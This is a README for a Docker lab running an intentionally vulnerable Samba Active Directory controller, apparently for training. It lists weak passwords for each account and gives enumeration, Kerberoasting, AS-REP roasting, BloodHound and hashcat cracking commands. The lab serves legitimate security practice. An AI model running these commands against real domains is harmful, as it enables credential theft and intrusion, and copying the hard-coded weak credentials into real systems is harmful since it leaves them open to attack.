# samba-ad — vulnerable Active Directory in Docker

A real Samba AD Domain Controller (LDAP/Kerberos/SMB/DNS) you attack with normal AD tools.
Not a Windows DC, but great for enumeration, Kerberoasting, AS-REP roasting, BloodHound.

## Start / stop
```bash
dlab up samba-ad          # build + run (first time builds the image)
dlab down samba-ad
IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' lab-samba-ad)
addhost $IP dc01.lab.local lab.local    # needed for Kerberos (hostname)
```

## Domain
- Realm `LAB.LOCAL` / domain `LAB` / DC `dc01.lab.local`
- **Administrator : Password123!**

## Accounts (intentionally weak)
| user | password | note |
|---|---|---|
| alice | Spring2024! | standard user |
| bob | Password1 | standard user |
| jdoe | Welcome1 | standard user |
| svc_sql | Summer2023! | **Kerberoastable** (SPN MSSQLSvc/...) |
| svc_web | MServerP@ss1 | **Kerberoastable** (SPN HTTP/...) |
| asrepuser | Autumn2024! | account for AS-REP practice |

## Attack it (see `cheat ad`)
```bash
nxc smb $IP                                   # fingerprint
nxc smb $IP -u alice -p Spring2024! --users --groups
impacket-GetUserSPNs -dc-ip $IP LAB.LOCAL/alice:Spring2024! -request   # kerberoast
impacket-GetNPUsers  -dc-ip $IP LAB.LOCAL/ -usersfile users.txt -no-pass  # AS-REP
nxc ldap $IP -u alice -p Spring2024! --bloodhound -c all --dns-server $IP
ldapsearch -x -H ldap://$IP -b "dc=lab,dc=local" "(objectClass=user)"
```
Then crack the tickets: `crack hashes.txt` (hashcat -m 13100 kerberoast / -m 18200 AS-REP).
